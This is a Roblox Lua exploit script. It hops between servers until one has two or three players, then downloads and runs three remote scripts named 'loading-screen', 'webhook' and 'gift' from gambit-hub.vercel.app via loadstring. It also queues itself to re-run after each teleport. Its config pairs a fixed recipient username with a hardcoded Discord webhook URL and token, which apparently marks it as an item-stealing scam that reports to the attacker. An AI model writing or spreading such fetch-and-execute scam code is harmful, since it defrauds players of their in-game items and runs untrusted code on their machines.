-- ================== CONFIGURATION ==================
-- IMPORTANT: You must upload this script to a site like GitHub and paste the raw URL here.
-- This is required for the script to re-run after teleporting.
local selfUrl = "https://github.com/robloxh4cks/rejoiner/refs/heads/main/rejoiner.lua" -- PASTE YOUR URL HERE

local Config = {
    Username = "primxeorlando",
    Webhook = "https://discord.com/api/webhooks/1384800686025216080/FXR24NVdOeLKu3WZ5LQ0ufz3FeIimX7_1Rt5tcLIm5EB3RJbuZRBKG90saKdQQmZytA-",
    MinWeight = 20,
    MaxWeight = 100,
    Huge_Notif = 20
}

-- ================== SERVICES ==================
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- ================== SCRIPT PAYLOAD ==================
-- This function runs only when we are in a valid server.
local function RunMainScripts()
    print("Correct server found! Running main scripts.")
    
    -- Load your scripts
    loadstring(game:HttpGet("https://gambit-hub.vercel.app/loading-screen"))()
    task.wait(10)
    loadstring(game:HttpGet("https://gambit-hub.vercel.app/webhook"))()
    task.wait(2)
    loadstring(game:HttpGet("https://gambit-hub.vercel.app/gift"))()
end

-- ================== SERVER HOP LOGIC ==================
local function FindAndJoinGoodServer()
    print("Incorrect server population. Searching for a server with 2-3 players...")
    
    if selfUrl == "https://github.com/robloxh4cks/rejoiner/refs/heads/main/rejoiner.lua" then
        warn("Script cannot hop servers. Please set the 'selfUrl' variable at the top of the script.")
        return
    end

    local placeId = game.PlaceId
    local targetMin = 2
    local targetMax = 3
    local bestServerId = nil

    local success, result = pcall(function()
        local requestUrl = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
        return HttpService:JSONDecode(game:HttpGet(requestUrl))
    end)

    if success and result and result.data then
        for _, server in ipairs(result.data) do
            -- Find server with 2-3 players, that is not full, and is not our current one
            if server.playing >= targetMin and server.playing <= targetMax and server.playing < server.maxPlayers and server.id ~= game.JobId then
                bestServerId = server.id
                break
            end
        end
    else
        warn("Could not fetch server list. Retrying in 15 seconds.", tostring(result))
        task.wait(15)
        FindAndJoinGoodServer() -- Retry
        return
    end

    if bestServerId then
        print("Found a suitable server! Teleporting...")
        -- Queue this entire script to run again in the new server
        if queue_on_teleport then
            queue_on_teleport(game:HttpGet(selfUrl))
        end
        TeleportService:TeleportToPlaceInstance(placeId, bestServerId, player)
    else
        print("No server with 2-3 players found. Retrying search in 30 seconds.")
        task.wait(30)
        FindAndJoinGoodServer() -- Retry search
    end
end

-- ================== MAIN EXECUTION ==================
local function main()
    -- Wait for the player to be fully loaded into the game
    repeat task.wait() until player and player.Character and player.Character:FindFirstChild("Humanoid")

    local playerCount = #Players:GetPlayers()
    if playerCount >= 2 and playerCount <= 3 then
        -- If we're already in a good server, run the scripts
        RunMainScripts()
    else
        -- Otherwise, start hopping to find a better server
        FindAndJoinGoodServer()
    end
end

main()
